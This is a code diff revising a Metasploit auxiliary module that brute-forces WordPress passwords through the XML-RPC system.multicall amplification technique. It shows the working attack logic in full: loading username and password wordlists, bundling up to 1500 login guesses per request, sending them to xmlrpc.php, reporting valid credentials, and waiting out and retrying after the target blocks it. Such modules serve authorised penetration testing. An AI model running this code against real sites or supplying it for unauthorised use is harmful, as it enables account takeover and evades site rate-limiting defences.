@@ -11,35 +11,36 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(
-              info,
-              'Name'            => 'WordPress XMLRPC Massive Bruteforce ',
-              'Description'     => %q{Wordpress Massive Burteforce attacks via wordpress XMLRPC service.},
-              'License'         => MSF_LICENSE,
-              'Author'          =>
-                  [
-                      'William (WCoppola@Lares.com)',
-                      'Sabri (@KINGSABRI)'
-                  ],
-              'References'      =>
-                  [
-                      ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
-                      ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
-                  ]
+            info,
+            'Name'         => 'WordPress XMLRPC Massive Bruteforce ',
+            'Description'  => %q{Wordpress Massive Burteforce attacks via wordpress XMLRPC service.},
+            'License'      => MSF_LICENSE,
+            'Author'       =>
+                [
+                  'Sabri (@KINGSABRI)',           # Module Writer
+                  'William (WCoppola@Lares.com)'  # Module Requester
+                ],
+            'References'   =>
+                [
+                  ['URL', 'https://blog.cloudflare.com/a-look-at-the-new-wordpress-brute-force-amplification-attack/'],
+                  ['URL', 'https://blog.sucuri.net/2014/07/new-brute-force-attacks-exploiting-xmlrpc-in-wordpress.html']
+                ]
           ))
 
     register_options(
         [
-            OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
-                                        File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
-            OptPath.new('WPPASS_FILE',  [ true, 'File containing passwords, one per line',
-                                          File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")])
+          OptPath.new('WPUSER_FILE', [true, 'File containing usernames, one per line',
+                                      File.join(Msf::Config.data_directory, "wordlists", "http_default_users.txt") ]),
+          OptPath.new('WPPASS_FILE', [true, 'File containing passwords, one per line',
+                                      File.join(Msf::Config.data_directory, "wordlists", "http_default_pass.txt")]),
+          OptInt.new('BLOCKEDWAIT', [true, 'Time(minutes) to wait if got blocked', 6])
         ], self.class)
 
 
     register_advanced_options(
         [
-            OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
-            OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5])
+          OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),
+          OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5])
         ], self.class)
   end
 
@@ -51,47 +52,52 @@ class Metasploit3 < Msf::Auxiliary
     File.readlines(datastore['WPPASS_FILE']).map {|pass| pass.chomp}
   end
 
-  def generate_xml user
+  def generate_xml(user)
 
-    print_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500
+    vprint_warning('Generating XMLs may take a while depends on the list file(s) size.') if passwords.size > 1500
     xml_payloads = []                          # Container for all generated XMLs
     xml = ""
     # Evil XML | Limit number of log-ins to 1700/request for wordpress limitation
     passwords.each_slice(1500) do |pass_group|
 
-      xml =  "<?xml version=\"1.0\"?>\n"
-      xml << "<methodCall>\n"
-      xml << "<methodName>system.multicall</methodName>\n"
-      xml << "<params>\n"
-      xml << " <param><value><array><data>\n"
-      pass_group.each  do |pass|
+      document = Nokogiri::XML::Builder.new do |xml|
+        xml.methodCall {
+          xml.methodName("system.multicall")
+          xml.params {
+          xml.param {
+          xml.value {
+          xml.array {
+          xml.data {
 
-        xml << "  <value><struct>\n"
-        xml << "  <member>\n"
-        xml << "    <name>methodName</name>\n"
-        xml << "    <value><string>wp.getUsersBlogs</string></value>\n"
-        xml << "  </member>\n"
-        xml << "  <member>\n"
-        xml << "    <name>params</name><value><array><data>\n"
-        xml << "     <value><array><data>\n"
-        xml << "      <value><string>#{user}</string></value>\n"
-        xml << "      <value><string>#{pass}</string></value>\n"
-        xml << "     </data></array></value>\n"
-        xml << "    </data></array></value>\n"
-        xml << "  </member>\n"
-        xml << "  </struct></value>\n"
+        pass_group.each  do |pass|
+          xml.value {
+          xml.struct {
+          xml.member {
+          xml.name("methodName")
+          xml.value { xml.string("wp.getUsersBlogs") }}
+            xml.member {
+            xml.name("params")
+            xml.value {
+            xml.array {
+            xml.data {
+            xml.value {
+            xml.array {
+              xml.data {
+                xml.value { xml.string(user) }
+                xml.value { xml.string(pass) }
+          }}}}}}}}}
+        end
 
+          }}}}}}
       end
-      xml << " </data></array></value></param>\n"
-      xml << "</params>\n"
-      xml << "</methodCall>"
 
-      xml_payloads << xml
+      xml_payloads << document.to_xml
     end
 
-    print_status('Generating XMLs just done.')
-    return xml_payloads
+    vprint_status('Generating XMLs just done.')
+    xml_payloads
   end
+
 
   #
   # Check target status
@@ -99,22 +105,15 @@ class Metasploit3 < Msf::Auxiliary
   def check_wpstatus
     print_status("Checking #{peer} status!")
 
-    case
-      when !wordpress_and_online?
-        print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress or you got blocked!")
-        :abort
-      when !wordpress_xmlrpc_enabled?
-        print_error("#{rhost}:#{rport}#{target_uri} does not enable XMLRPC")
-        :abort
-      else
-        print_status("Target #{peer} is running Wordpress")
+    if !wordpress_and_online?
+      print_error("#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress or you got blocked!")
+      return
+    elsif !wordpress_xmlrpc_enabled?
+      print_error("#{rhost}:#{rport}#{target_uri} does not enable XMLRPC")
+      return
+    else
+      print_status("Target #{peer} is running Wordpress")
     end
-  end
-
-  def parse_response(res)
-
-    resp.scan(/Incorrect username or password/)
-
   end
 
   def run
@@ -129,10 +128,10 @@ class Metasploit3 < Msf::Auxiliary
 
         opts =
             {
-                'method'  => 'POST',
-                'uri'     => wordpress_url_xmlrpc,
-                'data'    => xml,
-                'ctype'   =>'text/xml'
+              'method'  => 'POST',
+              'uri'     => wordpress_url_xmlrpc,
+              'data'    => xml,
+              'ctype'   =>'text/xml'
             }
 
         client = Rex::Proto::Http::Client.new(rhost)
@@ -151,20 +150,18 @@ class Metasploit3 < Msf::Auxiliary
               # If this gives exception then its the correct password
               value.struct.member[1].value.string.text
             rescue
-              user = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[0].text
-              pass = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[1].text
+              user = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[0].text.strip
+              pass = req_xml.document.methodCall.params.param.value.array.data.value[i].struct.member[1].value.array.data.value.array.data.value[1].text.strip
 
-              print_good("Credentials Found!  #{user}:#{pass}")
+              print_good("Credentials Found! #{user}:#{pass}")
               passfound = true
             end end
         rescue NoMethodError
-          print_error("It seems you got blocked!")
-          print_warning("I'll sleep for 6 minutes then I'll try  again. CTR+C to exit")
-          sleep 6 * 60
+          print_error('It seems you got blocked!')
+          print_warning("I'll sleep for #{datastore['BLOCKEDWAIT']} minutes then I'll try again. CTR+C to exit")
+          sleep datastore['BLOCKEDWAIT'] * 60
           retry
-          # return :abort
         end
-        print_status('Taking a nap for 2 seconds..')
         sleep 2
       end end end
 
